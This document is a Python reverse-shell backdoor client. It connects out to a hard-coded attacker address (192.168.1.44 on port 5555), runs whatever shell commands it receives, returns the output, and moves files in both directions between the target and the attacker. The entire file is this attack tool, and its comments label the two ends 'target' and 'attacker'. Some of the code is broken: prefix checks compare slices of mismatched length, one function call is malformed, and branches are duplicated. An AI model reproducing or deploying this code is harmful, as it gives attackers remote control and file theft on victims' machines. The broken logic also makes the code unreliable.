import socket
import time
import sys
import subprocess
import json
import os

# Upload file from target to server(attacker)
def upload_file(file_name):
    f = open(file_name, "rb")
    server_connection.send(f.read())

# Download incoming file from server(attacker)
def download_file(file_name):
    f = open(file_name, "wb")
    server_connection.settimeout(1)
    # Receive the first chunk of data
    chunk = server_connection.recv(1024)
    # Keep receiving data until none is available
    while chunk:
        f.write(chunk)
        try:
            chunk = server_connection.recv(1024)
        except socket.timeout as e:
            break
    server_connection.settimeout(None)
    f.close()

# Send data to the target
def reliable_send(data):
    json_data = json.dumps(data)
    server_connection.send(json_data.encode())

# Receive data from the target
def reliable_recv():
    json_data = ""
    nr_bytes = 1024
    while True:
        try:
            json_data = json_data + server_connection.recv(nr_bytes).decode().rstrip()
            return json.loads(json_data)
        except ValueError:
            continue

# Try to connect to the server every 10 seconds
def connection():
    while True:
        time.sleep(sleep_time)
        try:
            server_connection.connect(("192.168.1.44", 5555))
            shell()
            server_connection.close()
            break
        except:
            connection()

# Receive data from server
def shell():
    while True:
        # Wait for command from server(attacker)
        command = reliable_recv()
        if command == "quit":
            break
        elif command == 'clear':
			      pass
        elif command[:3] == "cd ":
            # Change directory to path after "cd "
            os.chdir(command[3:])
        elif command == "clear":
            pass
        # download command sent from server means we want to upload a file from target to server
        elif command[:8] == "download ":
            upload_file(command[9:])
        # upload command sent from server means we want to download a file from server to target
        elif command[:6] == "upload ":
            download_file(file_name)(command[7:])
        else:
            # Execute the command and send the result back to the server
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

# Initialize the socket and start execution
sleep_time = 10
server_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
